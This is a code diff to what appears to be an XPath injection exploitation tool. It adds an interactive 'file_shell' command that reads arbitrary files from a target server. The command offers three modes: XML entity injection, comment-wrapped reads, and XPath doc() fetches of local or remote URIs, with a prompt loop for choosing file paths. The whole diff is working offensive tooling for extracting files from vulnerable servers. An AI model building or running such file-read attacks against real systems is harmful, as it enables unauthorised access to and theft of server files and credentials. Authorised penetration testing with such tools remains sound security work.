@@ -8,7 +8,8 @@ import ipgetter
 from lib.requests.injectors import get_all_injectors
 from lib.executors import xpath1, xpath2, docfunction
 from lib.features.xpath_2 import XPath2
-from lib.xpath import E, N, document_uri
+from lib.features.entity_injection import EntityInjection
+from lib.xpath import E, N, document_uri, doc
 from lib.output import XMLOutput, JSONOutput
 from lib.requests import detector
 
@@ -120,6 +121,51 @@ def retrieve(ctx, query):
     click.echo("Retrieving {}".format(query))
     executor = ctx.obj["executor"]
     run_then_return(display_results(ctx.obj["output"], executor, E(query)))
+
+
+@run.command(help="Read arbitrary files from the filesystem")
+@click.pass_context
+def file_shell(ctx):
+    click.echo("There are three ways to read files on the file system using XPath:")
+    click.echo(" 1. inject: Can read arbitrary text files as long as they do not contain any XML")
+    click.echo(" 2. comment: Can read arbitrary text files containing XML snippets, but cannot contain '-->'")
+    click.echo(" 3. doc: Reads valid XML files - does not support any other file type. Supports remote file URI's (http) and local ones.")
+    click.echo("Type doc, inject or comment to switch modes. Defaults to inject")
+    click.echo("Type uri to read the URI of the document being queried")
+    click.echo("Note: The URI should have a protocol, e.g: file:///test.xml. Bad things may happen if the URI does not exist, and it is best to use absolute paths.")
+
+    entity_injection = ctx.obj["requester"].get_feature(EntityInjection)
+
+    commands = {
+        "doc": lambda p: run_then_return(display_results(ctx.obj["output"], ctx.obj["executor"], doc(p).add_path("/*[1]"))),
+        "inject": lambda p: click.echo(run_then_return(entity_injection.get_file(ctx.obj["requester"], file_path))),
+        "comment": lambda p: click.echo(run_then_return(entity_injection.get_file(ctx.obj["requester"], file_path, True))),
+    }
+    numbers = {
+        "1": "inject",
+        "2": "comment",
+        "3": "doc"
+    }
+    mode = "inject"
+
+    while True:
+        file_path = click.prompt("File URI")
+        if file_path == "uri":
+            executor = ctx.obj["executor"]
+            uri = run_then_return(
+                executor.get_string(document_uri(N("/")))
+            )
+            click.echo("URI: {}".format(uri))
+        elif file_path in commands or file_path in numbers:
+            if file_path in numbers:
+                file_path = numbers[file_path]
+            mode = file_path
+            click.echo("Switched to {}".format(mode))
+        else:
+            try:
+                commands[mode](file_path)
+            except Exception:
+                click.echo("Error reading file. Try another mode")
 
 
 @run.command(help="Get the URI of the document being queried")
